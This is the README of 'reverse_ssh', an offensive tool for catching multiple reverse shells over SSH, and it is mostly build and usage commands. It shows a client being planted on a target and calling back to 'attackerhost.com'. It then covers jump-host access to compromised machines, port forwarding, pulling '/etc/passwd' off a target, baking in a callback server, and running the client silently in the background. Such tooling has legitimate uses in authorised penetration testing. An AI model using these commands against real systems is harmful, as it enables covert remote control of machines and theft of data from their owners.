# Reverse SSH

Ever wanted to use SSH for reverse shells? Well now you can.  

The reverse SSH server lets you catch multiple reverse shells, using the fully statically compiled reverse shell binary.

```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+ Shelled |
                    |    Reverse     |       |         |  Client |
                    |  Connection    |       |         |         |
                    |    Catcher     |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |   SSH   |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         | Shelled |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         | Shelled |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```

## TL;DR

```sh
make
cd bin/

# start the server
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232

# copy client to your target then connect to the server
./client attackerhost.com:3232

# Get help text
ssh localhost -p 3232 help

# See clients
ssh localhost -p 3232 ls -t

                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+


# Connect to full shell
ssh -J localhost:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac

# Or using hostname 

ssh -J localhost:3232 root.wombo

```

## Setup Instructions

> **NOTE:** reverse_ssh requires Go **1.16** or higher. Please check you have at least this version via `go version`

The simplest build command is just:

```sh
make
```

Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.
If you need to build the client for a different architecture.

```sh
GOOS=linux GOARCH=amd64 make client
GOOS=windows GOARCH=amd64 make client # will create client.exe
```

You will need to create an `authorized_keys` file, containing *your* public key.
This will allow you to control whatever server catches.
Alternatively, you can use the --authorizedkeys flag to point to a file.

```sh
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control, then connect to the server.

```sh
./client yourserver.com:3232
```

You can then see what reverse shells have connected to you using `ls`:

```sh
ssh yourserver.com -p 3232 ls
                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+

```

Then typical ssh commands work, just specify your rssh server as a jump host. 

```sh
# Connect to full shell
ssh -J youserver.com:3232 root.wombo

# Run a command without pty
ssh -J youserver.com:3232 root.wombo ls

# Start remote forward 
ssh -R 1234:localhost:1234 -J youserver.com:3232 root.wombo ls

# Start dynamic forward 
ssh -D 9050 -J youserver.com:3232 root.wombo ls

# SCP 
scp -J youserver.com:3232 root.wombo:/etc/passwd .

```

## Fancy Features

### Default Server

At build time, you can specify a default server for the client binary to connect to:

```sh
$ RSSH_HOMESERVER=localhost:1234 make

# Will connect to localhost:1234, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to example.com:1234
$ bin/client example.com:1234
```

## Foreground vs Background (Important note about clients)

By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.

This has one important ramification: once in the background a client will not show any output, including connection failure messages. If you need to debug your client, use the `--foreground` flag.
